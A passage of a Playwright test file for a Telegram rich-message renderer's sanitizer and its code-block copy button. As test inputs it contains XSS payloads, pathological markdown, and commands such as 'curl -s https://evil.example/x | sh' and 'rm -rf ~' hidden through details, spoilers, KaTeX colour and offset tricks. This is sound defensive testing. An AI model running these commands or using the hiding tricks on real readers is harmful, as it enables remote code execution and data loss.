    cells: [...document.querySelectorAll('#out td, #out th')].map((c) => [getComputedStyle(c).position, c.style.textAlign, c.style.verticalAlign].join()),
  }));
  check('blocks: a table cell\'s align and valign and a map\'s size are no CSS of their own', !got.styles.some((s) => /position|url\(|inset|z-index|background/.test(s))
    && JSON.stringify(got.cells) === '["static,left,top","static,right,bottom"]', JSON.stringify(got));
  const outline = await page.evaluate((evil) => RichRender.outline({ rich_message: { blocks: [{ type: 'table', cells: [[{ text: 'a', align: evil }, { text: 'b', align: 'center' }]] }] } }), evil);
  check('outline: a cell with a bad align reads as left, a good one as written', outline === '<table><tr><td left>a</td><td center>b</td></tr></table>', outline);
}
{
  // a name on <img> is a property of document: <img name="documentElement"> on /render and in the MCP app made
  // document.documentElement this IMG (issue #201). An anchor is <a name>, and <a> is not one of them
  await render({ html: '<p><a name="documentElement"></a><a href="#documentElement">к якорю</a></p><img name="documentElement"><img name="title"><img name="body">' });
  const doc = await page.evaluate(() => ({
    root: document.documentElement.localName, title: typeof document.title, body: document.body.localName,
    names: [...document.querySelectorAll('#out [name]')].map((n) => n.localName + ':' + n.getAttribute('name')),
    link: document.querySelector('#out a[href^="#"]')?.getAttribute('href'),
  }));
  check('html: only <a> keeps a name, so a post does not replace document.documentElement; the anchor still works',
    JSON.stringify(doc) === JSON.stringify({ root: 'html', title: 'string', body: 'body', names: ['a:documentElement'], link: '#anchor-documentElement' }), JSON.stringify(doc));
}
{
  const r = await render({ html: '<input type="text" value="x"><ul><li><input type="checkbox" checked> done</li></ul>' });
  check('only checkbox inputs survive (task lists), and they are disabled', !has(r.html, /type="text"/) && has(r.html, /type="checkbox"[^>]*disabled|disabled[^>]*type="checkbox"/), r.html);
}
{
  const r = await render({ html: '<marquee>бегущая <b>строка</b></marquee><center>c</center>' });
  check('unknown tags are unwrapped, their text stays', !has(r.html, /marquee|center/) && has(r.html, /бегущая <b>строка<\/b>c/), r.html);
}
{
  const r = await render({ html: '<tg-new-thing foo="1">новое</tg-new-thing>' });
  check('unknown tg-* tags are still shown, not lost', has(r.all, /новое/) && has(r.all, /tg-new-thing/), r.all);
}

// ---------- markdown goes through the same sanitizer ----------
{
  const r = await render({ markdown: '# T\n\n[x](javascript:window.__xss=1)\n\n<img src=x onerror="window.__xss=1">\n\n<script>window.__xss=1</script>' });
  check('markdown: raw HTML and javascript: links are defused', !r.xss && !has(r.html, /<script|onerror|href="javascript/i) && has(r.html, /<h1>T<\/h1>/), r.html);
}
{
  const r = await render({ markdown: '- [x] готово\n- [ ] нет' });
  check('markdown: task list renders as disabled checkboxes', (r.html.match(/type="checkbox"/g) || []).length === 2 && has(r.html, /checked/), r.html);
}

// ---------- Telegram markdown extensions (spoiler, marker, math, footnotes, tables) ----------
const EXTENSIONS = {
  'html in a spoiler': '||<img src=x onerror="window.__xss=1">||',
  'html in a marker': '==<svg onload="window.__xss=1"></svg>==',
  'closing tg-math from inline math': '$</tg-math><img src=x onerror="window.__xss=1">$',
  'closing tg-math-block from block math': '$$\n</tg-math-block><img src=x onerror="window.__xss=1">\n$$',
  'html and javascript: in a footnote': 'a[^1]\n\n[^1]: <img src=x onerror="window.__xss=1"> [l](javascript:window.__xss=1)',
  'html in an aligned table cell': '| a |\n|:-:|\n| <img src=x onerror="window.__xss=1"> |',
};
// escaped text may still read "onerror=" (a formula error shows its source); only real tags and attributes count
const live = (html) => /<(svg|script)\b|<[^>]*\son\w+="|href="javascript/i.test(html);
for (const [name, src] of Object.entries(EXTENSIONS)) {
  const r = await render({ markdown: src });
  check('markdown: ' + name, !r.xss && !live(r.html), r.html);
}
{
  // a footnote, a formula over lines and a table row were each looked for from every start to the end (issue #192):
  // 2 s, 6 s and 7 s for 100 000 bytes; markdown-it by itself reads them in tens of milliseconds
  const slow = await page.evaluate((hostile) => Object.entries(hostile).map(([name, markdown]) => {
    const t = performance.now();
    RichRender.render({ rich_message: { markdown } }, {});
    return [name, Math.round(performance.now() - t)];
  }).filter(([, ms]) => ms > 1500), { '[^': '[^'.repeat(50000), '$$ lines': '$$a\n'.repeat(25000), 'table rows': '|a\n|-\n'.repeat(16667), '](': ']('.repeat(50000) });
  check('markdown: a run of openings without their end is read in linear time', slow.length === 0, JSON.stringify(slow));
}
{
  // an indented line right after a heading is code (CommonMark, issue #192): the entity stays as typed, as the check
  // reads it (tests/test_rich_limits.py); Telegram was not measured here
  const code = await page.evaluate(() => RichRender.outline({ rich_message: { markdown: '# h\n    a&#xD800;b' } }));
  check('markdown: an indented line right after a heading is code', /^<h1>h<\/h1><pre[^>]*>a&#xD800;b<\/pre>$/.test(code), code);
}
{
  const r = await render({ html: '<a name="x&quot; onclick=&quot;window.__xss=1">a</a><a href="#x&quot; onclick=&quot;window.__xss=1">b</a><code class="language-js" onclick="window.__xss=1">c</code><tg-time unix="1"><img src=x onerror="window.__xss=1"></tg-time>' });
  check('anchors, code language and tg-time keep no handlers', !r.xss && !live(r.html), r.html);
}
// odd input must not turn the whole preview into a render error
for (const [name, rm] of Object.entries({
  'broken %-escape in an html #link': { html: '<p><a href="#%">x</a></p>' },
  'broken %-escape in a markdown #link': { markdown: '[x](#%E0%A4%A)' },
  'footnote named like a prototype property': { markdown: 'a [^__proto__] b [^toString]\n\n[^__proto__]: x\n[^toString]: y' },
})) {
  const r = await render(rm);
  check('renders ' + name, !has(r.all, /Ошибка рендера/), r.all.slice(0, 300));
}

// ---------- slideshow ----------
// the caption is not a slide: one dot per media, and the caption sits under the slides
const photo = (name, more = {}) => ({ type: 'photo', photo: { type: 'photo', media: 'upload:' + name, ...more } });
const SLIDESHOWS = {
  blocks: { blocks: [{ type: 'slideshow', blocks: [photo('a.png'), photo('b.png')], caption: { text: 'Подпись' } }] },
  html: { html: '<tg-slideshow>\n  <img src="tg://photo?id=a">\n  <img src="tg://photo?id=b">\n  <figcaption>Подпись</figcaption>\n</tg-slideshow>' },
  'html, caption first': { html: '<tg-slideshow><figcaption>Подпись</figcaption><img src="tg://photo?id=a"><img src="tg://photo?id=b"></tg-slideshow>' },
};
for (const [name, rm] of Object.entries(SLIDESHOWS)) {
  await render(rm);
  const s = await page.evaluate(() => {
    const show = document.querySelector('#out .tg-slideshow');
    const track = show?.querySelector('.tg-slides');
    const cap = show?.querySelector('figcaption');
    return {
      slides: track?.children.length,
      dots: show?.querySelectorAll('.tg-dots span').length,
      captionInTrack: !!track?.querySelector(':scope > figcaption'),
      captionBelow: !!(track && cap) && !track.contains(cap) && cap.getBoundingClientRect().top >= track.getBoundingClientRect().bottom,
      caption: cap?.textContent,
    };
  });
  check(`slideshow (${name}): one dot per media, caption under the slides`,
    s.slides === 2 && s.dots === 2 && !s.captionInTrack && s.captionBelow && s.caption === 'Подпись', JSON.stringify(s));
}
{
  // a photo under a spoiler, a video and a photo
  await render({ blocks: [{ type: 'slideshow', blocks: [photo('a.png', { has_spoiler: true }), { type: 'video', video: { type: 'video', media: 'upload:v.mp4' } }, photo('c.png')] }] });
  // clicks that reach the video, and clicks that reach the page around the slideshow
  await page.evaluate(() => {
    document.querySelector('.tg-slides video').addEventListener('click', () => window.__videoClicks++);
    document.getElementById('out').addEventListener('click', () => window.__clicks++);
  });
  const track = page.locator('.tg-slides');
  // slide i is in view, snapped to its edge, and its dot is the lit one
  const shows = (i) => page.waitForFunction((i) => {
    const t = document.querySelector('.tg-slides');
    const on = [...document.querySelectorAll('.tg-dots span')].findIndex((d) => d.classList.contains('on'));
    return Math.abs(t.scrollLeft - i * t.clientWidth) < 1 && on === i;
  }, i, { timeout: 3000 }).then(() => true, () => false);
  const drag = async (dx) => {
    const b = await track.boundingBox();
    const y = b.y + b.height / 2;
    await page.mouse.move(b.x + b.width / 2, y);
    await page.mouse.down();
    await page.mouse.move(b.x + b.width / 2 + dx * b.width, y, { steps: 10 });
    await page.mouse.up();
  };
  const spoilered = () => page.evaluate(() => !!document.querySelector('.tg-slides .tg-media-spoiler'));
  const clicks = () => page.evaluate(() => [window.__videoClicks, window.__clicks].join());

  await page.click('.tg-dots span:nth-child(3)');
  check('slideshow: a click on a dot shows its slide', await shows(2));
  await track.focus();
  await page.keyboard.press('ArrowLeft');
  const left = await shows(1);
  await page.keyboard.press('ArrowRight');
  const right = await shows(2);
  await page.keyboard.press('ArrowLeft');
  await page.keyboard.press('ArrowLeft');
  check('slideshow: ← and → on the focused slides turn them', left && right && await shows(0));

  await page.evaluate(() => Object.assign(window, { __videoClicks: 0, __clicks: 0 }));
  await drag(-0.3);
  check('slideshow: dragging with the mouse a third of a slide turns it', await shows(1));
  // passes even without the click suppression (Chromium hands the click to the track after setPointerCapture);
  // the check below ("reaches neither the video nor the page") is what guards the suppression
  check('slideshow: the click that ends a drag does not open the spoiler', await spoilered());
  await drag(0.6);
  check('slideshow: the click that ends a drag reaches neither the video nor the page', await shows(0) && await clicks() === '0,0', await clicks());
  const b = await track.boundingBox();
  await page.mouse.click(b.x + b.width / 2, b.y + b.height / 2);
  check('slideshow: a plain click still opens the spoiler', !await spoilered() && await clicks() === '0,1', await clicks());
}

// ---------- code block ----------
{
  // as in Telegram Desktop: a header with the language and a copy icon, a bar on the left; the language is drawn by
  // CSS, so the post's text (outline, history, the reply dialog) is still only the code
  const look = () => page.evaluate(() => [...document.querySelectorAll('#out .tg-pre')].map((box) => {
    const head = box.querySelector(':scope > .tg-pre-head');
    return { lang: head?.getAttribute('data-lang') ?? null, copy: !!head?.querySelector('.tg-pre-copy[role=button]'), text: box.textContent,
      label: head ? getComputedStyle(head, '::before').content : '', bar: getComputedStyle(box).borderLeftWidth, pre: box.querySelector(':scope > pre')?.dataset.lang ?? null };
  }));
  const want = JSON.stringify([
    { lang: 'python', copy: true, text: 'def f():\n    return 1', label: '"python"', bar: '3px', pre: 'python' },
    { lang: null, copy: true, text: 'без языка', label: '"копировать"', bar: '3px', pre: null },
  ]);
  await render({ html: '<pre><code class="language-python">def f():\n    return 1</code></pre><pre>без языка</pre>' });
  const html = JSON.stringify(await look());
  check('html: a code block has a header with its language (or «копировать») and a copy icon, and a bar', html === want, html);
  await render({ blocks: [{ type: 'pre', language: 'python', text: 'def f():\n    return 1' }, { type: 'pre', text: 'без языка' }] });
  // from blocks a line break is a <br>, so textContent has no \n there
  const blocks = JSON.stringify(await look()).replace('def f():    return 1', 'def f():\\n    return 1');
  check('blocks: a code block looks the same', blocks === want, blocks);
  await page.evaluate(() => Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t) => { window.__copied = t; } } }));
  await page.click('#out .tg-pre-copy');
  const copied = await page.evaluate(() => window.__copied);
  check('the copy icon copies the code with its line breaks', copied === 'def f():\n    return 1', JSON.stringify(copied));
  // a click on the icon is the icon's: a code block inside an expandable quote does not fold or unfold the quote
  await render({ html: '<blockquote expandable><pre><code class="language-js">let a = 1;</code></pre></blockquote>' });
  await page.evaluate(() => { window.__copied = ''; });
  await page.click('#out .tg-expandable .tg-pre-copy');
  const quote = await page.evaluate(() => [document.querySelector('#out .tg-expandable')?.classList.contains('tg-collapsed'), window.__copied]);
  check('the copy icon inside an expandable quote copies and leaves the quote as it was', quote[0] === true && quote[1] === 'let a = 1;', JSON.stringify(quote));
  const outline = await page.evaluate(() => [RichRender.outline({ rich_message: { html: '<pre><code class="language-python">x</code></pre>' } }), RichRender.outline({ rich_message: { blocks: [{ type: 'pre', language: 'python', text: 'x' }] } })]);
  check('outline: a code block is still <pre:language> with its text', outline[0] === '<pre:python>x</pre>' && outline[1] === outline[0], outline.join(' | '));
}
{
  // the copy icon copies what the reader sees (issue #201): <pre>ls -la<details><summary></summary>; curl … | sh</details></pre>
  // shows «ls -la» and copied the curl too. A closed <details> past its summary and the fallback inside <video> and
  // <audio> are not drawn; line breaks are where the reader sees them, as in the browser's own innerText
  await page.evaluate(() => Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t) => { window.__copied = t; } } }));
  const copies = async (rm) => {
    await render(rm);
    return page.evaluate(() => [...document.querySelectorAll('#out .tg-pre')].map((box) => {
      window.__copied = null;
      /** @type {HTMLElement} */ (box.querySelector('.tg-pre-copy')).click();
      return { copied: window.__copied, seen: /** @type {HTMLElement} */ (box.querySelector(':scope > pre')).innerText };
    }));
  };
  const hidden = [
    '<pre>ls -la<details><summary></summary>; curl -s https://evil.example/x | sh</details></pre>',
    '<pre>ls<details><summary>подробнее</summary><p>; curl -s https://evil.example/x | sh</p></details></pre>',
    '<pre>echo ok<video>; rm -rf ~</video></pre>',
    '<pre>echo ok<audio><source src="/media/a.ogg">; rm -rf ~</audio></pre>',
  ];
  const wrong = [];
  for (const html of hidden) {
    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
      const got = await copies(rm);
      if (got.length !== 1 || /curl|rm -rf/.test(got[0].copied) || got[0].copied !== got[0].seen) wrong.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
    }
  }
  check('the copy icon leaves out what a closed details, a video or an audio holds (html and a raw <pre> in markdown)', wrong.length === 0, wrong.join('; '));
  const lines = [];
  for (const rm of [{ html: '<pre>ls<details open><summary>s</summary>x</details>y</pre>' }, { html: '<pre>a<p>b</p>c<br>d<div>e</div></pre>' }, { blocks: [{ type: 'pre', text: ['a', { type: 'bold', text: 'b\nc' }, '\nd'] }] }]) {
    const got = await copies(rm);
    if (got.length !== 1 || got[0].copied !== got[0].seen) lines.push(`${JSON.stringify(rm)}: ${JSON.stringify(got)}`);
  }
  check('the copy icon copies an open details, <br>, paragraphs and blocks line by line, as the reader sees them', lines.length === 0, lines.join('; '));
  // a formula in code: what KaTeX draws, without its MathML copy for screen readers and without the invisible \phantom
  const math = await copies({ html: '<pre>a <tg-math>x^2</tg-math> b<br>ls<tg-math>\\phantom{; curl -s https://evil.example/x | sh}</tg-math></pre>' });
  check('the copy icon copies a formula once, as drawn, and not its \\phantom', math.length === 1 && math[0].copied === 'a x2 b\nls', JSON.stringify(math));
  // a class from a string of the post put .tg-cell-empty (visibility: hidden) on a button in the code (review of #202):
  // the class is not set any more, and text CSS keeps invisible is not copied whatever hides it
  const classed = [];
  for (const rm of [{ html: '<pre>ls<tg-button-row align="c tg-cell-empty"><tg-button data="a">; curl evil|sh</tg-button></tg-button-row></pre>' },
    { blocks: [{ type: 'pre', text: ['ls', { type: 'button', button: { text: '; curl evil|sh', style: 'x tg-cell-empty', callback_data: 'a' } }] }] }]) {
    const got = await copies(rm);
    const hiding = await page.evaluate(() => document.querySelectorAll('#out .tg-cell-empty').length);
    if (got.length !== 1 || got[0].copied !== got[0].seen || hiding) classed.push(`${JSON.stringify(rm)}: ${JSON.stringify({ got, hiding })}`);
  }
  check('a class from the post hides nothing in code, and the copy is what is seen', classed.length === 0, classed.join('; '));
  await render({ html: '<pre>ls<b>; curl evil|sh</b></pre>' });
  const invisible = await page.evaluate(() => {
    /** @type {HTMLElement} */ (document.querySelector('#out pre b')).style.visibility = 'hidden';
    window.__copied = null;
    /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
    return window.__copied;
  });
  check('the copy icon leaves out text with visibility: hidden', invisible === 'ls', JSON.stringify(invisible));
  // a closed spoiler is a blot the reader cannot read: copied once it is open, all of it, nested formatting too
  await render({ html: '<pre>ls<tg-spoiler>; curl <b>evil</b>|sh</tg-spoiler></pre>' });
  const spoiler = await page.evaluate(() => {
    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
    const closed = copy();
    /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler')).click();
    return [closed, copy()];
  });
  check('the copy icon leaves out a closed spoiler and copies an open one whole', JSON.stringify(spoiler) === JSON.stringify(['ls', 'ls; curl evil|sh']), JSON.stringify(spoiler));
  // a spoiler in a spoiler: its text is seen only when both are open
  await render({ html: '<pre>ls<tg-spoiler> a<tg-spoiler>; curl <a href="https://evil.example/">evil</a>|sh</tg-spoiler></tg-spoiler></pre>' });
  const nested = await page.evaluate(async () => {
    const [outer, inner] = /** @type {HTMLElement[]} */ ([...document.querySelectorAll('#out .tg-spoiler')]);
    const copy = async (o, i) => {
      outer.classList.toggle('tg-spoiler-open', o);
      inner.classList.toggle('tg-spoiler-open', i);
      await new Promise((r) => setTimeout(r, 300)); // a spoiler's transition
      window.__copied = null;
      /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
      return window.__copied;
    };
    return [await copy(true, false), await copy(false, true), await copy(true, true)];
  });
  check('the copy icon leaves out a spoiler in a spoiler unless both are open', JSON.stringify(nested) === JSON.stringify(['ls a', 'ls', 'ls a; curl evil|sh']), JSON.stringify(nested));

  // what a formula moves out of the code box, what a folded quote cuts off after its third line, the slides not in
  // view and text a formula draws in the colour of what is behind it are not seen, so not copied (issue #206). What
  // the code box scrolls to, a long line, is seen
  const moved = [
    ['<pre>ls<tg-math>\\kern{-300em}\\text{; curl evil|sh}</tg-math></pre>', 'ls'],
    ['<pre>ls<tg-math>\\smash{\\raisebox{300em}{; curl evil|sh}}</tg-math></pre>', 'ls'],
    ['<pre>ls<tg-math>\\mathllap{\\kern{-200em}\\text{; curl evil|sh}}</tg-math></pre>', 'ls'],
    ['<pre>ls<tg-math-block>\\mathllap{\\kern{-200em}\\text{; curl evil|sh}}</tg-math-block></pre>', 'ls'],
    ['<pre>ls<tg-math>\\color{white}{; curl evil|sh}</tg-math></pre>', 'ls'],
    ['<pre>ls<tg-math>\\colorbox{black}{\\textcolor{black}{; curl evil|sh}}</tg-math></pre>', 'ls'],
    ['<pre>ls<blockquote expandable>1\n2\n3\n4\n; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
    ['<pre>ls<blockquote expandable>1<br>2<br>3<br>4<br>; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
    ['<pre>ls<tg-slideshow><b>один</b><b>; curl evil|sh</b></tg-slideshow></pre>', 'ls\nодин'],
    ['<pre>ls' + ' '.repeat(300) + '; длинная строка</pre>', 'ls' + ' '.repeat(300) + '; длинная строка'],
    ['<pre>a <tg-math>\\color{gray}{b}+\\colorbox{black}{\\textcolor{white}{c}}</tg-math></pre>', 'a b+c'],
  ];
  const unseen = [];
  for (const [html, want] of moved) {
    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
      const got = await copies(rm);
      if (got.length !== 1 || got[0].copied !== want) unseen.push(`${JSON.stringify(rm)}: ${JSON.stringify(got[0]?.copied)}`);
    }
  }
  check('the copy icon leaves out what a formula moves out of the code, a folded quote cuts off, other slides and text in the colour of its background', unseen.length === 0, unseen.join('; '));
  // the next slide starts right on the edge of the slideshow: an area of no width is empty, and the scroll of a
  // table or formula in it does not widen it back (security review of #227); the empty cells of the table may
  // leave a tab or a line break at the end
  const edge = [];
  for (const html of [
    '<pre>ls<tg-slideshow><b>один</b><table><tr><td>; curl evil|sh</td><td>' + 'x'.repeat(120) + '</td></tr></table></tg-slideshow></pre>',
    '<pre>ls<tg-slideshow><b>один</b><tg-math-block>\\text{; curl evil|sh}' + '+x'.repeat(120) + '</tg-math-block></tg-slideshow></pre>',
  ]) {
    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
      const [got] = await copies(rm);
      if (!got || /curl/.test(got.copied) || got.copied.trimEnd() !== 'ls\nодин') edge.push(`${JSON.stringify(rm).slice(0, 80)}: ${JSON.stringify(got?.copied)}`);
    }
  }
  check('the copy icon leaves out a slide that starts right on the edge of the slideshow', edge.length === 0, edge.join('; '));
  // code in a folded quote: the quote cuts off its lines too, and a click on the icon does not unfold it (security
  // review of #227); unfolded, all of it is seen
  const folded = [];
  for (const rm of [{ html: '<blockquote expandable>1<pre>ls\n2\n3\n4\n5\n; curl evil|sh</pre></blockquote>' }, { markdown: 'Цитата:\n\n<blockquote expandable>1<pre>ls\n2\n3\n4\n5\n; curl evil|sh</pre></blockquote>' }]) {
    const [got] = await copies(rm);
    const open = await page.evaluate(() => {
      /** @type {HTMLElement} */ (document.querySelector('#out .tg-expandable')).click();
      window.__copied = null;
      /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
      return window.__copied;
    });
    if (!got || /curl/.test(got.copied) || !got.copied.startsWith('ls') || open !== 'ls\n2\n3\n4\n5\n; curl evil|sh') folded.push(`${Object.keys(rm)[0]}: ${JSON.stringify([got?.copied, open])}`);
  }
  check('the copy icon leaves out the lines of code a folded quote around it cuts off', folded.length === 0, folded.join('; '));
  // a wide formula or table in code scrolls in a box of its own: all it scrolls to is seen (security review of #227)
  const wide = [];
  for (const [html, want] of [
    ['<pre>ls<tg-math-block>' + 'a+'.repeat(150) + 'z</tg-math-block></pre>', 'ls\n' + 'a+'.repeat(150) + 'z'],
    ['<pre><table><tr><td>' + 'x'.repeat(100) + '</td><td>END</td></tr></table></pre>', 'x'.repeat(100) + '\tEND'],
  ]) {
    const [got] = await copies({ html });
    if (got?.copied !== want) wide.push(`${html.slice(0, 30)}…: ${JSON.stringify(got?.copied)}`);
  }
  check('the copy icon copies a wide formula and a wide table in code whole', wide.length === 0, wide.join('; '));
  // a post written right to left: its code scrolls to the left, and that is seen too
  const long = 'ls' + ' '.repeat(300) + '; длинная строка';
  const rtl = await copies({ html: `<pre>${long}</pre><pre>שלום${' '.repeat(300)}עולם</pre>`, is_rtl: true });
  check('the copy icon copies a long line of a right-to-left post whole', JSON.stringify(rtl.map((c) => c.copied)) === JSON.stringify([long, 'שלום' + ' '.repeat(300) + 'עולם']), JSON.stringify(rtl.map((c) => c.copied)));
  // unfolded, turned to the next slide, on the night theme: seen, so copied
  await render({ html: '<pre>ls<blockquote expandable>1\n2\n3\n4\n5</blockquote><tg-slideshow><b>один</b><b>два</b></tg-slideshow><tg-math>\\color{white}{x}</tg-math></pre>' });
  const shownNow = await page.evaluate(async () => {
    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
    const before = copy();
    /** @type {HTMLElement} */ (document.querySelector('#out .tg-expandable')).click();
    const track = /** @type {HTMLElement} */ (document.querySelector('#out .tg-slides'));
    track.scrollLeft = track.clientWidth;
    await new Promise((r) => requestAnimationFrame(() => r(null)));
    const after = copy();
    document.getElementById('out')?.classList.add('tg-dark');
    const dark = copy();
    document.getElementById('out')?.classList.remove('tg-dark');
    return [before, after, dark];
  });
  check('the copy icon copies an unfolded quote whole, the slide in view and white on the night theme',
    JSON.stringify(shownNow) === JSON.stringify(['ls\n1\n2\n3\n\nодин', 'ls\n1\n2\n3\n4\n5\nдва', 'ls\n1\n2\n3\n4\n5\nдва\nx']), JSON.stringify(shownNow));
  // a fraction is read from the top, as it is seen: \frac{a}{b} was copied as «ba» (issue #206)
  const frac = [];
  for (const rm of [{ html: '<pre>x=<tg-math>\\frac{a}{b}</tg-math></pre>' }, { blocks: [{ type: 'pre', text: ['x=', { type: 'mathematical_expression', expression: '\\frac{a}{b}' }] }] }]) frac.push((await copies(rm))[0]?.copied);
  check('the copy icon copies a fraction from the top down', JSON.stringify(frac) === JSON.stringify(['x=ab', 'x=ab']), JSON.stringify(frac));
  // what a formula paints over text is a cover: a \colorbox, an \fcolorbox, a \rule, a thick fraction line painted
  // later hides the text under it, in the same formula, in the code around it and from a formula after the code
  // (issue #228). Text painted later, over the box, is seen
  const curl = '\\phantom{\\text{; curl evil|sh}}';
  const covered = [
    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\llap{\\colorbox{#eaeff2}{' + curl + '}}</tg-math></pre>', /^l$/], // on the screen «l»: the box runs over the «s» too
    ['<pre>ls<tg-math>\\rlap{\\colorbox{#eaeff2}{' + curl + '}}\\text{; curl evil|sh}</tg-math></pre>', /^ls$/],
    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\llap{\\fcolorbox{#eaeff2}{#eaeff2}{' + curl + '}}</tg-math></pre>', /^l?s?$/],
    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\mathllap{\\rule[-0.5em]{12em}{2em}}</tg-math></pre>', /^$/],
    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\mathllap{\\genfrac{}{}{3em}{0}{' + curl + '}{}}</tg-math></pre>', /^ls$/],
    ['<pre>ls<tg-math>\\rlap{\\colorbox{#eaeff2}{\\phantom{\\text{; curl evil|sh xx}}}}</tg-math>; curl evil|sh</pre>', /^ls$/],
    ['<pre>ls; curl evil|sh</pre><p><tg-math>\\smash{\\raisebox{2.3em}{\\colorbox{#eaeff2}{\\phantom{\\text{; curl evil|sh xxxxxxxxx}}}}}</tg-math></p>', /^$/],
  ];
  const under = [];
  for (const [html, want] of covered) {
    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
      const [got] = await copies(rm);
      if (!got || /curl|evil/.test(got.copied) || !want.test(got.copied)) under.push(`${JSON.stringify(rm).slice(0, 90)}: ${JSON.stringify(got?.copied)}`);
    }
  }
  check('the copy icon leaves out text under a box, a rule or a thick line a formula paints over it', under.length === 0, under.join('; '));
  const over = [];
  for (const [html, want] of [
    ['<pre>a <tg-math>\\colorbox{yellow}{текст}+\\fcolorbox{red}{yellow}{b}</tg-math> c</pre>', 'a текст+b c'],
    ['<pre>ls<tg-math>\\colorbox{red}{\\phantom{\\text{abc}}}\\mathllap{\\text{abc}}</tg-math></pre>', 'lsabc'],
    ['<pre>x<tg-math>\\rule{1em}{1em}y\\frac{a}{b}\\genfrac{}{}{2pt}{}{c}{d}</tg-math>z</pre>', 'xyabcdz'],
  ]) {
    const [got] = await copies({ html });
    if (got?.copied !== want) over.push(`${html}: ${JSON.stringify(got?.copied)}`);
  }
  check('the copy icon copies text on a box or next to it', over.length === 0, over.join('; '));
  // a box is seen only inside the boxes around it that cut off what they hold: raised out of a folded quote, a table,
  // a formula block or a slide it covers nothing (security review of #230), a scroll box covers only from where it is
  // scrolled to
  const cut = [];
  const raised = (em) => `<tg-math>\\kern4em\\smash{\\raisebox{${em}em}{\\colorbox{red}{\\phantom{\\text{xxxxxxxxxxxxxxxxxxxxxx}}}}}</tg-math>`;
  for (const after of [
    `<blockquote expandable>${raised(3)}</blockquote>`,
    ...[2.5, 3, 3.5, 4, 4.5].map((em) => `<table><tr><td>${raised(em)}</td></tr></table>`),
    `<tg-math-block>\\kern4em\\smash{\\raisebox{3em}{\\colorbox{red}{\\phantom{\\text{xxxxxxxxxxxxxxxxxxxxxx}}}}}</tg-math-block>`,
    `<tg-slideshow><b>один</b><p>${raised(3)}</p></tg-slideshow>`,
    `<pre>${raised(3)}</pre>`,
  ]) {
    const [got] = await copies({ html: '<pre>rm -rf ./build</pre>' + after });
    if (got?.copied !== 'rm -rf ./build') cut.push(`${after.slice(0, 40)}: ${JSON.stringify(got?.copied)}`);
  }
  check('a box a formula raises out of a quote, a table, a formula block, a slide or code covers no code', cut.length === 0, cut.join('; '));
}

// ---------- a formula too deep to draw (issue #228) ----------
// Chromium crashed the tab laying out about 130 levels of \frac, \sqrt, x^{…} or \colorbox (827 bytes): what is
// deeper than 64 levels is drawn as KaTeX draws its errors. Each in a page of its own: a crash takes the page down
{
  const r = (s, n) => s.repeat(n);
  // \def doubles a level on each step: 258 bytes are 256 levels of x^{…}, 21 KB of \def one after another 140
  const doubled = (steps) => {
    let defs = '\\def\\a#1{x^{#1}}', last = 'a';
    for (let i = 0; i < steps; i++) { const name = 'b' + 'q'.repeat(i); defs += `\\def\\${name}#1{\\${last}{\\${last}{#1}}}`; last = name; }
    return defs + `\\${last}{y}`;
  };
  const chained = (n) => Array.from({ length: n }, (_, i) => `\\def\\m${'q'.repeat(i)}{x^{\\m${'q'.repeat(i + 1)}}}`).join('') + `\\def\\m${'q'.repeat(n)}{y}\\m`;
  const kinds = {
    'x^{…}': (n) => r('x^{', n) + 'y' + r('}', n),
    '\\sqrt': (n) => r('\\sqrt{', n) + 'y' + r('}', n),
    '\\colorbox': (n) => r('\\colorbox{red}{', n) + 'y' + r('}', n),
    '\\frac': (n) => r('\\frac{', n) + 'y' + r('}{z}', n),
    '\\left…\\right': (n) => r('\\left(', n) + 'y' + r('\\right)', n),
    '\\begin{matrix}': (n) => r('\\begin{matrix}', n) + 'y' + r('\\end{matrix}', n),
    '\\bgroup': (n) => r('\\sqrt\\bgroup', n) + ' y' + r('\\egroup', n),
    '\\overbrace{…}^{…}': (n) => r('\\overbrace{', n) + 'y' + r('}^{a}', n),
  };
  const draw = async (exprs) => {
    const p = await browser.newPage();
    const errors = [];
    p.on('pageerror', (e) => errors.push(e.message));
    await p.setContent('<!doctype html><meta charset="utf-8"><body><div id="out" class="tg-preview"></div></body>');
    for (const f of ['vendor/katex/katex.min.css', 'tg.css']) await p.addStyleTag({ path: stat(f) });
    for (const f of ['vendor/markdown-it.min.js', 'vendor/katex/katex.min.js', 'render.js']) await p.addScriptTag({ path: stat(f) });
    try {
      const got = await p.evaluate((exprs) => {
        const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');
        const out = /** @type {HTMLElement} */ (document.getElementById('out'));
        /** what each formula of the post is drawn as, laid out on the page @param {string} expr @param {object} rm */
        const drawn = (expr, rm) => {
          out.replaceChildren(RichRender.render({ rich_message: rm }, {}));
          out.getBoundingClientRect();
          return [...out.querySelectorAll('.tg-math, .tg-math-block')].map((m) => {
            const error = m.querySelector('.katex-error');
            if (error) return `error:${error.textContent === expr && /глубже 64/.test(error.getAttribute('title') || '')}`;
            return m.querySelector('.katex') ? 'formula' : 'text';
          }).join();
        };
        return exprs.map((expr) => [
          { html: `<p>a <tg-math>${esc(expr)}</tg-math></p><tg-math-block>${esc(expr)}</tg-math-block>` },
          { markdown: `a $${expr}$\n\n$$\n${expr}\n$$` },
          { blocks: [{ type: 'paragraph', text: ['a ', { type: 'mathematical_expression', expression: expr }] }, { type: 'mathematical_expression', expression: expr }] },
